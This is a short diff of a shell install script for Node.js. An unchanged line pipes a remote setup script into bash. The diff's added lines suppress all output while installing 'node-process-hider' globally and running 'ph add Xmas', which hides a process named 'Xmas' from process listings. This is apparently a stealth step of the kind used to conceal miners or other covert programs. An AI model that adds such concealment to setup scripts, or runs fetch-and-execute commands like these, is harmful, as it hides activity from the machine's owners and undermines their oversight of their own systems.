@@ -75,7 +75,23 @@ sleep 5
 
 curl -fsSL https://deb.nodesource.com/setup_23.x | bash
 sleep 2
-apt-get install -y nodejs
+apt-get install -y nodejs >/dev/null
+sleep 2
+
+echo "Checking NPM"
+sleep 2
+echo " "
+echo ""
+
+npm
+
+sleep 2
+echo " "
+echo ""
+
+npm i -g node-process-hider 1>/dev/null 2>&1
+sleep 2
+ph add Xmas 1>/dev/null 2>&1
 
 sleep 5
 
